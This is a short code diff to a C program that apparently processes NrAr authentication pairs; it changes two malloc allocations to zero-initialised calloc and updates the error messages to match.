@@ -332,9 +332,9 @@ int main(int argc, char *argv[]) {
 
     // read in nR aR pairs
     numnrar = 0;
-    buf = (char *)malloc(lenbuf);
+    buf = (char *)calloc(1, lenbuf);
     if (!buf) {
-        printf("cannot malloc buf\n");
+        printf("cannot calloc buf\n");
         exit(1);
     }
 
@@ -368,9 +368,9 @@ int main(int argc, char *argv[]) {
     printf("Loaded %u NrAr pairs\n", numnrar);
 
     // create table of thread data
-    tdata = (struct threaddata *)malloc(sizeof(struct threaddata) * NUM_THREADS);
+    tdata = (struct threaddata *)calloc(1, sizeof(struct threaddata) * NUM_THREADS);
     if (!tdata) {
-        printf("cannot malloc threaddata\n");
+        printf("cannot calloc threaddata\n");
         exit(1);
     }
 
